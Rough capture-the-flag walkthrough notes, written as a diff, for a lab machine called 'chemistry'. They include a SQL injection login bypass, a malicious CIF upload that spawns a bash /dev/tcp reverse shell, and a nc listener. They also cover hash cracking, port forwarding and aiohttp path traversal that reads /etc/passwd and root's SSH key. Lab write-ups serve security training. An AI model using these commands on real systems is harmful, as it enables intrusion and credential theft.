@@ -1,0 +1,126 @@
+nmap -sV -sC -vv -p- -oA nmap/chemistry ip address
+
+charm glow charm Mods
+
+
+go to the http://chemistry:5000/
+
+Register as admin/password 
+
+go to the login
+
+and try to do SQl injection
+
+username = admin' OR 1=1 LIMIT1;-- -
+
+register the user: admin' OR 1=1 LIMIT1;-- -
+password test
+
+download the example.cif file 
+
+cat the example.cif file 
+
+google what we can do with CIF vulnerabilities 
+
+find POC
+
+git clone the repo
+
+change the example.cif with the poc
+
+in the os system, change the "touch pwn"  insert the  reverse shell "bash -i >& /dev/tcp/ipaddress/9001 0>&1" or try to do "bash -c 'bash -i >& /dev/tcp/ipaddress/9001 0>&1'"
+
+start a nc listener
+nc -lvnp 9001
+
+upload the example.cif file 
+
+view the file
+go back to terminal and got reverseshell 
+
+do a python -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+
+stty raw -echo;fg
+
+export TERM=xterm-256color
+
+enter *2
+
+looking for databases
+
+cat app.py
+
+looking for creds
+
+found sql database 
+
+find database 
+
+find / -f database.db
+
+if unsure what kind of file or database it is, use 
+file database.db
+
+sqlite3 database 
+
+find tables 
+.tables
+
+select * from user;
+
+copy the user and password
+
+use hashcat/crackstation to break the hashes 
+
+try ssh with the username and cracked passwords 
+
+try sudo -l
+
+cat /etc/passwd
+
+list users with valid shells 
+grep -vE "nologin|false" /etc/passwd
+
+find files owned by root
+
+find / -user root 2>/dev/null | grep -vE "/proc|/sys|/home|/run"
+
+use linpease to try and find vulnerabilities 
+
+find open ports and headers 
+
+using
+ps -ef --forest
+ss -tuln
+ 
+try to curl the 127.0.0.1:8080
+
+curl -I 127.0.0.1:8080
+
+do a porforwarding
+
+~C
+ssh -L our port we want:ipaddress:port its running on 
+
+ssh -L 8081:127.0.0.1:080
+
+go to 127.0.0.1:8081
+
+view the page source 
+
+find versions and applications that are being used 
+
+gooogle search aiohttp:/3.9.1 vulnerabilities 
+
+LFI path traversal vulnerability 
+
+in the reverseshell do 
+
+curl -s --path-as-is http://127.0.0.1:8080/assets/../../../../../etc/passwd
+
+getting root flag 
+
+curl -s --path-as-is http://127.0.0.1:8080/assets/../../../../../root/root.txt
+
+get the root ssh key curl -s --path-as-is http://127.0.0.1:8080/assets/../../../../../root/.ssh/id_rsa
